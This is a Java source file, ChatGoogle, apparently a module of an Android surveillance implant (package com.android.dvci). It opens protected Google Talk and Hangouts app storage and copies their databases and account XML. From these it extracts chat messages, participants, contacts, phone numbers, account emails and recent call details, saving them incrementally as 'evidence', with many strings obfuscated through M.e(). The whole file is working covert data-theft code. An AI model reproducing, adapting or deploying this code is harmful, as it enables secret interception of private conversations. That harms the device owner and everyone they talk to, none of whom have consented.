package com.android.dvci.module.chat;

import android.database.Cursor;

import com.android.dvci.auto.Cfg;
import com.android.dvci.crypto.Digest;
import com.android.dvci.db.GenericSqliteHelper;
import com.android.dvci.db.RecordVisitor;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.dvci.manager.ManagerModule;
import com.android.dvci.module.ModuleAddressBook;
import com.android.dvci.module.call.CallInfo;
import com.android.dvci.util.Check;
import com.android.dvci.util.StringUtils;
import com.android.mm.M;

import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.concurrent.Semaphore;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

public class ChatGoogle extends SubModuleChat {

	private static final String TAG = "ChatGoogle";

	private static final int PROGRAM_GTALK = 0x04;
	private static final int PROGRAM_HANGOUT = 0x12;

	String pObserving = M.e("com.google.android.talk");

	private Semaphore readBabelSemaphore = new Semaphore(1);

	static GtalkEntity owner = null ;
	public static final String XML_PREF_DIR = M.e("/data/data/com.google.android.talk/shared_prefs");
	public static final String XML_PREF_FILE = M.e("accounts.xml");
	public static final String DB_CHAT_DIR = M.e("/data/data/com.google.android.talk/databases");
	public static final String DB_TALKFILE = M.e("talk.db");
	public static final String DB_TALK_DIR = M.e("/data/data/com.google.android.gsf/databases");
	public static final String ADDRESS_SUFFIX = M.e("-addresses");
	private static LinkedHashMap<String, String> db2id = new LinkedHashMap<String, String>();

	/**
	 * Fill phone number and other details of the selected account
	 *
	 * @param n account number -1 to look for the active one
	 * @return
	 */
	public static boolean initAccountDetails(int n) {
		if(owner == null || owner.getAccountNumber() != n ) {
			getDb(n);
		}
		if(owner != null){
			ChatGoogle.readSharedInfo(owner);
			return true;
		}
		return false;
	}

	public static GtalkEntity getOwner(int n) {
		if(owner == null || owner.getAccountNumber() != n ) {
			initAccountDetails(n);
		}
		return owner;
	}

	@Override
	int getProgramId() {
		return PROGRAM_GTALK;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification stop)");
		}
		readChatMessages();
	}

	/**
	 * Estrae dal file RegisterPhone.xml il numero di telefono
	 *
	 * @return
	 */
	@Override
	protected void start() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart)");
		}
		collectAccounts(); // creates map between dbName and id used to quickly get id
		readChatMessages(); // cycles through all the dbName available and extract all accounts
	}

	// create map between dbName and id used to quickly get id
	private void collectAccounts() {
		for (String s : new AutoFile(DB_CHAT_DIR).list("babel",".db")) {
			Pattern p = Pattern.compile("-?\\d+");
			Matcher m = p.matcher(s);
			if (m.find()) {
				String id = m.group();
				db2id.put(s,id);
			}
		}
		if(new AutoFile(DB_TALK_DIR+"/"+DB_TALKFILE).exists()){
			db2id.put(DB_TALKFILE,"-1");
		}
	}

	private void readChatMessages() {

		if (!readBabelSemaphore.tryAcquire()) {
			return;
		}

		try {
			if(db2id.size()>0) {
				LinkedHashMap<String,Long> lastlines = markup.unserialize(new LinkedHashMap<String,Long>());
				Iterator<String> dbFiles = db2id.keySet().iterator();
				while(dbFiles.hasNext()){
					String db = dbFiles.next();
					long lastLine=0;
					if (lastlines.containsKey(db)){
						lastLine=lastlines.get(db);
					}
					if(db.equals(DB_TALKFILE)){ // check talk.db for retro compatibility
						lastLine = readGoogleTalkMessages(lastLine);
						lastlines.put(db, lastLine);
					}else {
						GtalkEntity account = getAccount(db);
						if (account != null) {
							if( account.isGaiaValid()) {
								ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.HANGOUT, account.getGaiaId(), account.getAccountDisplayName());
								// Save contacts if AddressBook is active for valid db
								if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
									saveHangOutContacts( db, lastlines,account.getGaiaId());
								}
							}
							if ( account.hasMail()){
								ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GOOGLE, account.getAccountMail(), account.getAccountDisplayName());
							}
							lastLine = readHangoutMessages(lastLine, db, account.getAccountDisplayName());
							lastlines.put(db, lastLine);

						}
					}
				}
				serializeMarkup(lastlines);
			}
		} finally {
			readBabelSemaphore.release();
		}
	}

	private void saveHangOutContacts(String dbName, LinkedHashMap<String, Long> lastlines, String owner_gaia_id) {
		String dbName_addr = dbName+ADDRESS_SUFFIX;
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(DB_CHAT_DIR, dbName);
		if (helper == null ) {
			return ;
		}
		long lastline = 0;
		if(lastlines.containsKey(dbName_addr)) {
			Long ll = lastlines.get(dbName_addr);
			if (ll != null) {
				lastline = ll.longValue();
			}
		}

		// transport_typ == 3 indicates sms , so skips it
		String sql_m = String.format(M.e("select gaia_id, full_name, fallback_name, first_name, _id ") +
						M.e("from participants where gaia_id not null and gaia_id!='%s' and full_name not null and  _id>%d"),
				owner_gaia_id, lastline);

		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				// I read a line in a conversation.
				String contact_gaia_id = cursor.getString(0);
				String fullName = cursor.getString(1);
				String fall = cursor.getString(2);
				String first_name = cursor.getString(3);
				int id = cursor.getInt(4);
				if(StringUtils.isEmpty(fullName)){
					fullName = fall;
				}
				if (!StringUtils.isEmpty(contact_gaia_id) && !StringUtils.isEmpty(fullName)) {
					Contact c = new Contact(contact_gaia_id,contact_gaia_id ,fullName, "");
					Long gaia_id = null;
					try {
						gaia_id =  Long.parseLong(contact_gaia_id);
					} catch (NumberFormatException ex) {
						gaia_id = Digest.CRC32(contact_gaia_id.getBytes());
					}
						if (!ModuleAddressBook.createEvidenceRemoteFull(ModuleAddressBook.HANGOUT, gaia_id, fullName, "", "", contact_gaia_id)) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (saveHangOutContacts): failure saving contacts="+c);
							}
							return id;
						}
				}
				return id;
			}
		};

		long newLastId = helper.traverseRawQuery(sql_m, new String[]{}, visitor);
		if(newLastId>lastline){
			lastlines.put(dbName_addr, newLastId);
		}

	}

	private void serializeMarkup(LinkedHashMap<String,Long> lastLines) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages): updating markup");
		}
		try {
			markup.writeMarkupSerializable(lastLines);
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatWeChatMessages) Error: " + e);
			}
		}
	}

	private long readHangoutMessages(long lastLines, String dbFile, String account) {

		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(DB_CHAT_DIR, dbFile);
		if (helper == null) {
			return lastLines;
		}

		try {
			ChatGroups groups = new ChatGroups();

			long newHangoutReadDate = 0;
			List<HangoutConversation> conversations = getHangoutConversations(helper, account, lastLines);
			for (HangoutConversation sc : conversations) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readHangoutMessages) conversation: " + sc.id + " date: " + sc.date);
				}

				// retrieves the lastConvId recorded as evidence for this
				// conversation
				if ( !groups.hasMemoizedGroup(sc.id)) {
					fetchHangoutParticipants(helper, account, sc.id, groups);
					//groups.addPeerToGroup(sc.id, account);
				}

				long lastReadId = fetchHangoutMessages(helper, sc, groups, lastLines);
				newHangoutReadDate = Math.max(newHangoutReadDate, lastReadId);

			}
			if (newHangoutReadDate > 0) {
				lastLines = newHangoutReadDate;
			}
		} finally {
			helper.disposeDb();
		}
		return lastLines;
	}

	private long fetchHangoutMessages(GenericSqliteHelper helper, final HangoutConversation conversation, final ChatGroups groups, long lastTimestamp) {
		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
		// transport_typ == 3 indicates sms , so skips it
		String sql_m = String.format(M.e("select m.author_gaia_id, full_name, fallback_name ,text, timestamp, type, p.chat_id ") +
						M.e("from messages as m join participants as p on m.author_gaia_id = p.gaia_id where transport_type!=3 and type<3 and conversation_id='%s' and timestamp>%s"),
				conversation.id, lastTimestamp);

		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				// I read a line in a conversation.
				String author_gaia_id = cursor.getString(0);
				String fullName = cursor.getString(1);
				String peer = cursor.getString(2);
				String body = cursor.getString(3);
				long timestamp = cursor.getLong(4);

				boolean incoming = cursor.getInt(5) == 2;


				//if (fallback_name!=null)
				//	peer = fallback_name;

				// localtime or gmt? should be converted to gmt
				Date date = new Date(timestamp / 1000);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) peer: " + peer + " timestamp: " + timestamp + " incoming: "
							+ incoming);
				}

				boolean isGroup = conversation.isGroup();

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) incoming: " + incoming + " group: " + isGroup);
				}

				String from, to = null;
				String fromDisplay, toDisplay = null;

				from = author_gaia_id;
				fromDisplay = groups.getContact(author_gaia_id).name;

				to = groups.getGroupToId(fromDisplay, conversation.id);
				toDisplay =  groups.getGroupToName(fromDisplay, conversation.id);

				if (!StringUtils.isEmpty(body)) {
					MessageChat message = new MessageChat(PROGRAM_HANGOUT, date, from, fromDisplay, to, toDisplay,
							body, incoming);

					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) message: " + message.from + " "
								+ (message.incoming ? "<-" : "->") + " " + message.to + " : " + message.body);
					}
					messages.add(message);
				}

				return timestamp;
			}
		};

		long newLastId = helper.traverseRawQuery(sql_m, new String[]{}, visitor);

		if (messages != null && messages.size() > 0) {
			saveEvidence(messages);
		}

		return newLastId;
	}

	public void saveEvidence(ArrayList<MessageChat> messages) {
		getModule().saveEvidence(messages);
	}

	private void fetchHangoutParticipants(GenericSqliteHelper helper, final String account, final String thread_id, final ChatGroups groups) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchHangoutParticipants) : " + thread_id);
		}

		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				String id = cursor.getString(0);
				String fullname = cursor.getString(1);
				String fallback = cursor.getString(2);
				Contact contact;

				String email = fullname;
				if (email == null)
					return 0;

				contact = new Contact(id, email, fullname, "");

				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchParticipants) %s", contact);
				}

				if (email != null && id != null) {
					groups.addPeerToGroup(thread_id, contact);
				}
				return 0;
			}
		};

		String sqlquery = M.e("select  p.gaia_id, full_name, fallback_name, cp.conversation_id from conversation_participants as cp join participants as p on  cp.participant_row_id=p._id where conversation_id=?");
		helper.traverseRawQuery(sqlquery, new String[]{thread_id}, visitor);
	}

	private List<HangoutConversation> getHangoutConversations(GenericSqliteHelper helper, final String account, long timestamp) {
		final List<HangoutConversation> conversations = new ArrayList<HangoutConversation>();

		String[] projection = new String[]{M.e("conversation_id"), M.e("latest_message_timestamp"), M.e("conversation_type"), M.e("generated_name")};
		String selection = "transport_type!=3 and latest_message_timestamp > " + timestamp; //exclude sms transport_type!=3

		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				HangoutConversation c = new HangoutConversation();
				c.account = account;

				c.id = cursor.getString(0);
				c.date = cursor.getLong(1);
				c.group = cursor.getInt(2) == 2;
				c.remote = cursor.getString(3);

				c.group = true;
				conversations.add(c);
				return 0;
			}
		};

		helper.traverseRecords(M.e("conversations"), visitor);

		return conversations;

	}
	static public ArrayList<String> readAccountsXmlSets(String nameField,String type) {

		Path.unprotect(XML_PREF_DIR, XML_PREF_FILE, true);

		/* example
		<set name="1.phone_verification">
		<string>+393349115140,false,true,1,false</string>
		<string>+393346405249,false,true,1,false</string>
		</set>
		*/

		DocumentBuilder builder;
		ArrayList<String> values = new ArrayList<String>();
		try {
			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
			Document doc = builder.parse(new File(XML_PREF_DIR, XML_PREF_FILE));
			NodeList defaults = doc.getElementsByTagName("set");
			for (int i = 0; i < defaults.getLength(); i++) {
				Node d = defaults.item(i);
				NamedNodeMap attributes = d.getAttributes();
				Node attr = attributes.getNamedItem("name");
				// nameField = "0.name"
				if ( attr!=null && nameField.equals(attr.getNodeValue())) {
					int nNode = d.getChildNodes().getLength();
					for ( int c=0 ; c < nNode; c++ ) {
						Node n = d.getChildNodes().item(c);
						String localName = n.getNodeName();
						if(localName != null && type.contentEquals(localName)) {
							String s =n.getTextContent();
							values.add(s);
						}
					}
					break;
				}
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readAccountsXml) Error: " + e);
			}
		}
		return values;
	}
	static public String readAccountsXml(String nameField, String type,String attribute) {

		Path.unprotect(XML_PREF_DIR, XML_PREF_FILE, true);

		DocumentBuilder builder;
		String value = null;
		try {
			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
			Document doc = builder.parse(new File(XML_PREF_DIR, XML_PREF_FILE));
			NodeList defaults = doc.getElementsByTagName(type);
			for (int i = 0; i < defaults.getLength(); i++) {
				Node d = defaults.item(i);
				NamedNodeMap attributes = d.getAttributes();
				Node attr = attributes.getNamedItem("name");
				// nameField = "0.name"
				if ( attr!=null && nameField.equals(attr.getNodeValue())) {
					if( attribute == null) {
						Node child = d.getFirstChild();
						value = child.getNodeValue();
					}else{
						if(attributes.getNamedItem(attribute)!=null){
							value = attributes.getNamedItem(attribute).getNodeValue();
						}
					}
					break;
				}
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readAccountsXml) Error: " + e);
			}
		}
		return value;
	}

	private long readGoogleTalkMessages(long lastLines) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}

		try {


			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(DB_TALK_DIR, DB_TALKFILE);

			if (helper == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages) Error, file not readable: " + DB_TALKFILE);
				}
				return lastLines;
			}

			try {
				setMyAccount(helper);

				// Save contacts if AddressBook is active
				if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
					saveContacts(helper);
				}

				long newLastLine = fetchGTalkMessages(helper, lastLines);
				lastLines = newLastLine;

			} finally {
				helper.disposeDb();
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatWeChatMessages) Error: ", ex);
			}
		}
		return lastLines;
	}

	private long fetchGTalkMessages(GenericSqliteHelper helper, long lastLine) {
		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

		String sqlquery = M.e("select m.date, ac.name, m.type, body, co.username, co.nickname from messages as m join  contacts as co on m.thread_id = co._id join accounts as ac on co.account = ac._id where m.consolidation_key is null and m.type<=1 and m.date>?");
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				long createTime = cursor.getLong(0);
				// localtime or gmt? should be converted to gmt
				Date date = new Date(createTime);
				String account = cursor.getString(1);
				int isSend = cursor.getInt(2);
				boolean incoming = isSend == 1;
				String content = cursor.getString(3);
				String co_username = cursor.getString(4);
				String co_nick = cursor.getString(5);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) %s] %s %s %s: %s ", date, account, (incoming ? "<-" : "->"), co_nick,
							content);
				}
				String from_id, from_display, to_id, to_display;

				if (co_nick == null || co_nick.startsWith(M.e("private-chat"))) {
					return 0;
				}

				if (incoming) {
					from_id = co_username;
					from_display = co_nick;
					to_id = account;
					to_display = account;
				} else {
					from_id = account;
					from_display = account;
					to_id = co_username;
					to_display = co_nick;
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) %s -> %s", from_id, to_id);
				}
				MessageChat message = new MessageChat(PROGRAM_GTALK, date, from_id, from_display, to_id, to_display, content,
						incoming);
				messages.add(message);

				return createTime;
			}
		};
		long lastCreationLine = helper.traverseRawQuery(sqlquery, new String[]{Long.toString(lastLine)}, visitor);

		getModule().saveEvidence(messages);

		return lastCreationLine;
	}

	private void setMyAccount(GenericSqliteHelper helper) {
		String[] projection = new String[]{"_id", "name", "username"};
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				int id = cursor.getInt(0);
				String name = cursor.getString(1);
				String username = cursor.getString(2);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (setMyAccount) %s, %s", name, username);
				}

				ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GOOGLE, name);

				return id;
			}
		};

		long ret = helper.traverseRecords("accounts", visitor);

	}

	private void saveContacts(GenericSqliteHelper helper) {
		String[] projection = new String[]{"username", "nickname"};

		boolean tosave = false;
		RecordVisitor visitor = new RecordVisitor(projection, "nickname not null ") {

			@Override
			public long cursor(Cursor cursor) {

				String username = cursor.getString(0);
				String nick = cursor.getString(1);

				Contact c = new Contact(username, username, nick, "");
				if (username != null && !username.endsWith(M.e("public.talk.google.com"))) {
					if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.GOOGLE, c)) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (cursor) need to serialize");
						}
						return 1;
					}
				}
				return 0;
			}
		};

		if (helper.traverseRecords(M.e("contacts"), visitor) == 1) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveContacts) serialize");
			}
			ModuleAddressBook.getInstance().serializeContacts();
		}
	}

	public static void readSharedInfo(GtalkEntity obj) {
		String phone = "";
		String accountNumber = "";
		if(obj == null) {
			Check.log(TAG + " (readSharedInfo): owner is null, nothing to fill");
			return ;
		}

			accountNumber = String.valueOf(obj.getAccountNumber());

		if(accountNumber != null) {
			ArrayList<String> res = readAccountsXmlSets(accountNumber+M.e(".phone_verification"),M.e("string"));
			if( res!= null && !res.isEmpty()){
				for(String s: res){
					if(s.split(",").length >1){
						phone += s.split(",")[0]+";";
					}
				}
				if(Cfg.DEBUG) {
					Check.log(TAG +  " (readSharedInfo): phone numbers are : " + phone);
				}
			}else{

				phone = "none";
			}
			obj.setPhone(phone);
		}
		/* use the account_name
				<string name="3.display_name">samsung s3mini</string>
				<string name="3.account_name">samsungs3minitest1@gmail.com</string>
		*/

		obj.setAccountDisplayName(readAccountsXml(accountNumber + ".display_name", M.e("string"), null));
		obj.setAccountMail(readAccountsXml(accountNumber + ".account_name", M.e("string"), null));
	}
	public static String getActiveAccount() {
		// recover the active account at the moment of the call:
		String active = readAccountsXml(M.e("active"),M.e("int"),"value");
		try{
			if(Cfg.DEBUG) {
				Check.log(TAG +  " (getActiveAccount): active account is: " + active);
			}
			//check value integrity.
			int n = Integer.parseInt(active);
		}catch (Exception e){
			if(Cfg.DEBUG) {
				Check.log(TAG +  " (getActiveAccount): ERROR converting int " + active, e);
			}
			active = null;
		}
		return active;
	}
	public static String getActiveDb() {
		String dbFile = null;
		String active = getActiveAccount();
		if( active!= null) {
			try {
				dbFile = getDb(Integer.parseInt(active));
			}catch (Exception e){
				Check.log(TAG + " (getActiveDb): failed to getDb ", e);
			}
		}
		return dbFile;
	}
	public static String getDb(int n) {
		String dbFile = null;
		dbFile = M.e("babel") + n + ".db";
		fillOwnerAccount(dbFile);
		return dbFile;
	}

	public static void fillOwnerAccount(String dbFile) {
					owner = getAccount(dbFile);
	}
	/**
	 * Searches all the participant inside the passed string, which is a pipe separated participants list
	 *
	 * @param dbFile open db
	 * @return returns a LinkedHashMap of GtalkEntity, where the key is the id found in the participants table
	 */

	public static GtalkEntity getAccount(String dbFile) {

		GtalkEntity res = null;
		String filter = "";
		if (StringUtils.isEmpty(dbFile)) {
			if(Cfg.DEBUG) {
				Check.log(TAG +  " (getOwner): ERROR invalid parameters");
			}
			return res;
		}
		if( new File(DB_CHAT_DIR + "/" + dbFile).exists() ) {
			//* extract accountId name from dbName */
			String gaia_id = null;
			if (db2id.containsKey(dbFile)) {
				String account_sysid_s = db2id.get(dbFile);
				gaia_id = readAccountsXml(account_sysid_s + ".gaia_id", "string", null);
				if(gaia_id==null){
					if (Cfg.DEBUG) {
						Check.log(TAG + " (getOwner): gaia_id for dbFile=" + dbFile + " not found this is a SMS account");
					}
				}
				Integer account_sysid = null;
				try {
					account_sysid = Integer.parseInt(account_sysid_s);
				} catch (Exception e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (getOwner): Failed to parse id=" + account_sysid_s, e);
					}
				}

				if (account_sysid == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (getOwner):failure to parse account sysid for dbFile=" + dbFile + " id=" + account_sysid_s);
					}
					return res;
				}


				//try getting id.name
				String aname = readAccountsXml(account_sysid_s + ".name", "string", null);
				if (StringUtils.isEmpty(aname)) {
					//try getting id.account_name
					aname = readAccountsXml(account_sysid_s + ".account_name", "string", null);

				}
				if (!StringUtils.isEmpty(aname)) {
					if (StringUtils.isEmpty(gaia_id)) {
						res = new GtalkEntity(GtalkEntity.INVALID, 0, aname);
					} else {
						res = new GtalkEntity(gaia_id, 0, aname);
					}
					res.setAccountNumber(account_sysid);
					res.setMessagesDbFile(dbFile);
					readSharedInfo(res);
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (getOwner): dbFile=" + dbFile + " invalid account!");
					}
				}
			}
		}
		return res;
	}
	/**
	 * Searches all the participant inside the passed string, which is a pipe separated participants list
	 *
	 * @param helper open db helper
	 * @param participants list,if empty list is passed, only the account owner returned
	 * @return returns a LinkedHashMap of GtalkEntity, where the key is the id found in the participants table
	 */

	public static LinkedHashMap<Integer, GtalkEntity> getParticipants(GenericSqliteHelper helper, String participants) {
		final LinkedHashMap<Integer, GtalkEntity> _res = new LinkedHashMap<Integer, GtalkEntity>();
		String filter = "";
		if (helper == null || participants == null || participants.contentEquals("")) {
			if(Cfg.DEBUG) {
				Check.log(TAG +  " (getCurrentCall): ERROR invalid parameters");
			}
			return _res;
		}


		String sqlquery = M.e("select _id,full_name,first_name,phone_id,gaia_id from participants where ");
		String[] p=new String[]{};
		/* converts participant list in query filter */
		if (participants.contains("|")) {
			p = participants.split("\\|");
		} else {
			p = new String[]{participants};
		}
		int i = 0;
		for (String id : p) {
			try {
				Integer.parseInt(id);
				if (i > 0) {
					sqlquery += M.e(" or ");
				}
				sqlquery += M.e(" _id = ") + id;
				i++;
			} catch (Exception x) {
				if (Cfg.DEBUG) {
					Check.log(TAG +  " (getCurrentCall): ERROR converting int " + id);
				}
			}
		}

		RecordVisitor visitor = new RecordVisitor() {
			@Override
			public long cursor(Cursor cursor) {
				int id = cursor.getInt(0);
				String name = cursor.getString(1);
				String gtalk_id = cursor.getString(4);
				_res.put(id, new GtalkEntity(gtalk_id, id, name));
				return id;
			}
		};
		try {
			helper.traverseRawQuery(sqlquery, new String[]{}, visitor);
		}finally {
			helper.disposeDb();
		}
		// reorder the list as for participants parameter
		LinkedHashMap<Integer, GtalkEntity> res = new LinkedHashMap<Integer, GtalkEntity>();
		for (String id : p) {
			try {
				res.put(Integer.parseInt(id),_res.get(Integer.parseInt(id)));
			}catch (Exception e){
				if (Cfg.DEBUG) {
					Check.log(TAG +  " (getCurrentCall): ERROR converting int " + id);
				}
			}
		}
		return res;
	}

	public static boolean getCurrentCall(final CallInfo callInfo) {
		if(callInfo == null){
			return false;
		}
		String dbFile = getActiveDb(); // getActiveDb also fill owner
		GtalkEntity tmp = getAccount(dbFile);

		String local_gaia = tmp.getGaiaId();
		final String[] participants = new String[1];
		callInfo.account = tmp.getPhone();
		String sqlquery = M.e("select m.timestamp, m.author_chat_id, m.participant_keys, m.type from messages as m where m.type = 8 and m.timestamp not null order by m.timestamp desc limit 1");
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				long createTime = cursor.getLong(0);

				callInfo.timestamp = new Date(createTime);
				if(Cfg.DEBUG) {
					Check.log(TAG +  " (getCurrentCall): timestamp=" + createTime);
				}
				callInfo.valid = true;
				participants[0] = cursor.getString(2);
				return createTime;
			}
		};
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(DB_CHAT_DIR, dbFile);
		if (helper == null) {
			return false;
		}

		try {
			helper.traverseRawQuery(sqlquery, new String[]{}, visitor);
			if (callInfo.valid) {
				LinkedHashMap<Integer, GtalkEntity> peers = getParticipants(helper, participants[0]);
				if (peers.size() >= 1) {
					callInfo.peer = "";
					boolean first = true;
					for (GtalkEntity p : peers.values()) {
						if (first) {
						 /* first participant on the list is the caller, so if the caller is the account
						  * tha call is outgoing
						  */
							if (p.gtalk_id_str.contentEquals(local_gaia)) {
								callInfo.incoming = false;
							} else {
								callInfo.incoming = true;
							}

							first = false;
						}
						if (!p.gtalk_id_str.contentEquals(local_gaia)) {
							callInfo.peer += p.displayName + ",";
						}

					}
				} else {
					callInfo.valid = false;
				}
			}
		}finally {
			helper.disposeDb();
		}

		return callInfo.valid;
	}

	public static class GtalkEntity {
		private static final String INVALID = "invalid_gaia";
		public String gtalk_id_str;
		private int _id;//this is the id of the entry inside the participants table
		public String displayName;
		private String phone=null;
		private String messagesDbFile = null;
		private int accountNumber=-1;
		private String accountDisplayName = null;
		private String accountMail = null;

		private GtalkEntity(String gtalk_id, int _id, String displayName) {
			this.gtalk_id_str = gtalk_id;
			this._id = _id;
			this.displayName = displayName;
		}

		public String getPhone() {
			return phone;
		}

		public void setPhone(String phone) {
			this.phone = phone;
		}

		public String getMessagesDbFile() {
			return messagesDbFile;
		}

		public void setMessagesDbFile(String messagesDbFile) {
			this.messagesDbFile = messagesDbFile;
		}

		public int getAccountNumber() {
			return accountNumber;
		}

		public void setAccountNumber(int accountNumber) {
			this.accountNumber = accountNumber;
		}

		public void setAccountDisplayName(String display_name) {
			this.accountDisplayName=display_name;
		}

		public void setAccountMail(String account_name) {
			this.accountMail = account_name;
		}

		public String getAccountDisplayName() {
			return accountDisplayName;
		}

		public String getAccountMail() {
			return accountMail;
		}

		public String getGaiaId() {
			return gtalk_id_str;
		}

		public boolean isGaiaValid() {
			return getGaiaId()!=null && !getGaiaId().equalsIgnoreCase(GtalkEntity.INVALID);
		}
		public boolean hasMail() {
			return getAccountMail()!=null && getAccountMail().contains("@");
		}
	}
}
